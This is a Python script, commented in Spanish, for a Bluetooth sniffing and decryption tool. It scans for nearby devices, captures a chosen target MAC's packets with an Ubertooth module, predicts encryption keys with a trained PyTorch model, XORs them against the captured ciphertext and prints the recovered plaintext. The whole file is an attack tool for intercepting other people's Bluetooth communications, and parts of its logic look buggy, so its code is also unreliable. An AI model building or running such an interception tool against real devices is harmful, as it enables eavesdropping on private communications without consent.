import sys
import platform
import os
import re
import torch
import numpy as np
from unittest import result
from metodos import *
import UbertoothSniff as Ubertooth
from training import BitArray
#creamos una lista de plataformas permitidas
PLATAFORMAS_PERMITIDAS = {'linux'}

# leemos comandos cortos desde consola
def LeerConsola():
  # ejecutamos el sniffer a travez de un controlador generico bluetooth (scapy)
  if(sys.argv[1]=='--sniff' or sys.argv[1]=='-S'):
    Sniffear(sys.argv[2])
    pass
  # escaneamos los dispositivos en el area (scapy,bluez)
  if(sys.argv[1]=='--scan' or sys.argv[1]=='-s'):
    Escanear(sys.argv[2])

def ComprobarMac(MAC):
  # MAC: AA:BB:CC:DD:EE:FF
  # 2 5 8 11 14
  comprobado =  False
  repetir = False
  caracteres_permitidos = ["0","1","2","3","4","5","6","7","8","9","A","a","B","b","C","c","D","d","E","e","F","f",":"]
  while comprobado == False:
    repetir = False
    if len(MAC) != 17 :
      print ("la direccion es erronea, recuerde que el formato es el siguiente: \nMAC: AA:BB:CC:DD:EE:FF\n\tPruebe de nuevo")
      repetir = True
    else:
      if not (MAC[2]==":" and MAC[5]==":" and MAC[8]==":" and MAC[11]==":" and MAC[14] ==":") : 
        print ("la direccion es erronea, recuerde que el formato es el siguiente: \nMAC: AA:BB:CC:DD:EE:FF\n\tPruebe de nuevo")
        repetir = True
      else:
        for caracter in MAC:
          if caracter  not in caracteres_permitidos:
            print("la direccion contiene caracteres no validos\nrecuerde que el formato es el siguiente: \nMAC: AA:BB:CC:DD:EE:FF\n\tPruebe de nuevo")  
            repetir = True    
        
    if repetir == False:
        comprobado = True  
    if repetir == True:
      input()
      os.system("clear")
      print("Introduzca la direccion MAC objetivo: ")
      MAC = input()
  
  return MAC
# menu en el cual podemos elegir que hacer
def Menu():
  print("Elija una opcion a realizar: ")
  print("1) Escanear Dispositivos por HCI")
  print("2) Introducir Bluetooth MAC para empezar el SNIFF")
  opcion = input()
  if(1 == int(opcion)):
    os.system('clear')
    iface = SetearBT()
    dispositivo = Escanear(iface)
  if(2 == int(opcion)):
    os.system('clear')
    print("Introduzca la direccion MAC objetivo: ")
    MAC = input()
    MAC = ComprobarMac(MAC)
    os.system("clear")
    print("Estamos analizando el trafico de paquetes, mantengase a la espera")
    datos = Ubertooth.main(MAC)
    data = DeepLearning(MAC,datos)
    if data is None :
      exit
    else:
      paquete = desencriptar(data)
      for pkt in paquete:
        print ("El mensaje cifrado es : {}".format(pkt[1]))
        print ("El mensaje descifrado es : {}".format(pkt[2]))
        msg = pkt[2]
        msg = bytes.fromhex(msg)
        clear_msg = msg.decode("charmap")
        print ("el mensaje es : {}".format(clear_msg))
      # print (paquete)

def desencriptar(datos):
  resultado = []
  r=[]
  for paquete in datos:
    resultado = []
    clave = paquete[0]
    mensaje = paquete[1]
    mensaje_bits = BitArray(mensaje)
    for bit in range(len(mensaje_bits)) :
      resultado.append(mensaje_bits[bit] ^ clave[(bit%128)])
    # print("resultado --> {}".format(resultado))
    resultado = binTohex(resultado)
    # print ("{},{}".format(mensaje,resultado))
    r.append([clave,mensaje,resultado])
  return r

def binTohex (valor):
  cadena=""
  bits = []
  cont =0 
  val =0
  for x in valor :
    bits.append(x)
    # print ("el valor de los bits es : {}".format(bits))
    if((cont%4) == 3):
      for y in bits:
        # print ("y->>{}".format(y))
        val=val<<1
        val = val | y
      # print("el val es: {}".format(val))
      # print("el valor en hexadecimal generado es : {}".format(getHex(val)))
      cadena =cadena + getHex(val)
      val = 0
      bits = []
    cont +=1
  return cadena

def getHex(val):
  r=""
  if val == 0:
    r="0"
  elif val == 1:
    r="1"
  elif val == 2:
    r="2"
  elif val == 3:
    r="3"
  elif val == 4:
    r="4"
  elif val == 5:
    r="5"
  elif val == 6:
    r="6"
  elif val == 7:
    r="7"
  elif val == 8:
    r="8"
  elif val == 9:
    r="9"
  elif val == 10:
    r="a"
  elif val == 11:
    r="b"
  elif val == 12:
    r="c"
  elif val == 13:
    r="d"
  elif val == 14:
    r="e"
  elif val == 15:
    r="f"
  return r
  
#metodo que se encarga de recoger los datos necesarios para ejecutar los procesos de deep learning, transformar los datos de entero/hex a binario y viceversa para ver el resultado
def ToBinaryDec(decimal):
  decimal = int(decimal)
  resultado = []
  while int(decimal) >1:
    r  = int(decimal)%2
    decimal = int(decimal)/2
    resultado.append(r)
  resultado.append(1)
  while len(resultado) != 32:
    resultado.append(0)
  tmp = []
  for x in range(len(resultado)):
    tmp.append(resultado[31-x])
  resultado = tmp
  del tmp
  return resultado
  
def ToBinaryMAC(MAC):
  tmp=""
  for x in MAC:
    if(x != ":"):
      tmp+=x
  resultado = BitArray(tmp)
  return resultado
# [  [[1234,12342345,354],asdfasdfasdf],[[]]

def Limpiar(valor):
  while len(valor) > 48:
    valor.pop(48)
  return valor

def DeepLearning( MAC, datos):
  tmp = []
  mac = ToBinaryMAC(MAC) 
  bits = []
  resultados = []
  result = []
  if datos == []:
    print("no se han conseguido paquetes")
    return
  else: 
    # guardamos los bits de la direccion mac
    for x in mac:
      bits.append(x)
    # [[1234,12342345],354]  
    for paquete in datos:
      relojes = paquete[0]
      datos = paquete[1]
      
      # [1234,12342345]
      for clock in relojes:
        # modificar datos en binario
        clk = ToBinaryDec(clock)
        tmp.append(clk)
      
      for x in tmp :
        for y in x:
          bits.append(y)

        # por cada uno de los relojes registrados ejecutamos comparacion
        muestra = np.array(bits,dtype=np.float32)
        data = torch.from_numpy(muestra)
      
        # cargar el modelo
        model = torch.load("modelo.pth")
        # predecir 
        prediccion = model(data)
        for elemento in range(128):
          if prediccion[int(elemento)] >=0.5:
            result.append(1)
          else:
            result.append(0)
        r = []
        r.append(result)
        r.append(datos)
        resultados.append(r)
        bits = mac
        bits = Limpiar(bits)

  return resultados
  # transformar datos en hex 
  
# main, punto de inicio    
def main() -> None:
  if sys.platform not in PLATAFORMAS_PERMITIDAS:
    raise RuntimeError("Error,Plataforma no compatible")
# si ejecutamos sin comandos 
  if len(sys.argv) == 1:
    Menu()
# En el caso de que establezcamos parametros
  else:
    LeerConsola()

if __name__ =="__main__":
  main()